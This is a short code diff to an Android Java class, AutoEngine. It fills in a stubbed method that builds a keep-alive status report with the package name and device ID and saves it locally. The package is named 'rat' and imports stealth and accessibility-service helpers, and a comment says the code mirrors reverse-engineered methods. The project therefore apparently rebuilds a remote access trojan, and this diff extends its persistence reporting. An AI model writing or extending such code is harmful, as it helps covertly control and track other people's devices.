@@ -16,7 +16,9 @@ import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.helper.StealthHelper;
 import com.vendor.rat.helper.StealthIntent;
 import com.vendor.rat.model.req.ListenWindow;
+import com.vendor.rat.model.resp.PowerControlStateVO;
 import com.vendor.rat.service.MyAccessibilityService;
+import com.vendor.rat.utils.SharedUtils;
 
 import java.util.ArrayList;
 import java.util.HashSet;
@@ -621,8 +623,22 @@ public abstract class AutoEngine {
      * 对应逆向: c.t0()
      */
     protected void t0() {
-        // TODO: VENDOR_VERIFY — 构建 PowerControlStateVO 并发送
-        log("t0() 上报保活状态");
+        try {
+            PowerControlStateVO state = new PowerControlStateVO();
+            state.setPackageName(primaryPackage);
+            String deviceId = com.vendor.rat.network.NetworkManager.getInstance().getDeviceId();
+            if (deviceId != null && !deviceId.isEmpty()) {
+                state.setDeviceId(deviceId);
+            }
+            reportPowerControlState(state);
+            log("t0() 上报保活状态: " + state);
+        } catch (Exception e) {
+            logError("t0() error", e);
+        }
+    }
+
+    protected void reportPowerControlState(PowerControlStateVO state) {
+        SharedUtils.savePowerControlState(state);
     }
 
     /**
